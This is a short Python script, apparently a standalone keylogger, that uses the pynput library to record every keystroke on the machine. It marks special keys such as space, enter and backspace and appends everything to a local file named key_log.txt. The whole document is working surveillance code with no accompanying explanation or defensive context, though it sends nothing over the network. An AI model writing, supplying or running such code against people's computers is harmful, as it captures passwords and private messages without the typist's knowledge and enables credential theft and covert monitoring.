from pynput.keyboard import Listener

log_file = "key_log.txt"

def write_key(key):
    key = str(key).replace("'", "")
    with open(log_file, "a") as file:
        if key == "Key.space":
            file.write(" ")
        elif key == "Key.enter":
            file.write("\n")
        elif key == "Key.backspace":
            file.write("[BACKSPACE]")
        elif "Key" in key:
            file.write(f"[{key}]")
        else:
            file.write(key)

def on_press(key):
    write_key(key)

with Listener(on_press=on_press) as listener:
    listener.join()

